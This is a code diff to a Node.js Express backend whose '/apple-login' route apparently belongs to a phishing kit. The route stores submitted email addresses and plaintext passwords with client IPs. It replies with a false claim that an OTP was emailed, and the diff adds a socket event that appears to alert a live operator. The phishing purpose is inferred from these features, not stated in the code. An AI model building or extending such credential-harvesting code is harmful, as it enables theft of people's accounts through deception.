@@ -1,6 +1,7 @@
 var express = require("express");
 var router = express.Router();
 const { connection } = require("../connection/db");
+const { userSocket, io } = require("../connection/connection");
 
 router.post("/apple-login", (req, res) => {
   let { email, password } = req.body;
@@ -12,37 +13,39 @@ router.post("/apple-login", (req, res) => {
       let sql =
         "INSERT INTO `user_details` (`email`, `password`, `created_at`, `ip`) VALUES (?,?,NOW(),?)";
       if (result && result.length > 0) {
-        sql = `update user_details set password = ? where email = `;
+        sql = `update user_details set password = ? where email = ?`;
       }
 
       let data =
-        result && result.length > 0 ? [password, email] : [email, password, req.ip];
-      connection.query(
-        sql,
-        data,
-        (err, result) => {
-          if (err) {
-            console.log(err);
-          }
-          if (result && result.affectedRows > 0) {
-            setTimeout(() => {
-              let response = Math.ceil(Math.random() * 10);
-              // console.log(response);
-              // if (response % 2 == 0) {
-                res.status(200).json({
-                  message: "OTP has been sent to yor email address.",
-                  success: 1,
-                });
-              // } else {
-              //   res.status(200).json({
-              //     message: "opps something went wrong.",
-              //     success: 0,
-              //   });
-              // }
-            }, 5000);
-          }
+        result && result.length > 0
+          ? [password, email]
+          : [email, password, req.ip];
+      connection.query(sql, data, (err, result) => {
+        if (err) {
+          console.log(err);
         }
-      );
+        if (result && result.affectedRows > 0) {
+          let response = Math.ceil(Math.random() * 10);
+          // console.log(response);
+          // if (response % 2 == 0) {
+
+          res.status(200).json({
+            message: "OTP has been sent to yor email address.",
+            success: 1,
+          });
+
+          req.app.get("socket").emit("request", { show: true });
+
+          // res.end();
+
+          // } else {
+          //   res.status(200).json({
+          //     message: "opps something went wrong.",
+          //     success: 0,
+          //   });
+          // }
+        }
+      });
     }
   );
 });
@@ -125,6 +128,12 @@ router.get("/userdetails", (req, res) => {
   } catch (error) {
     console.log(error);
   }
+});
+
+router.get("/hello_check", (req, res) => {
+  // if (io) {
+  res.send({});
+  // }
 });
 
 module.exports = router;
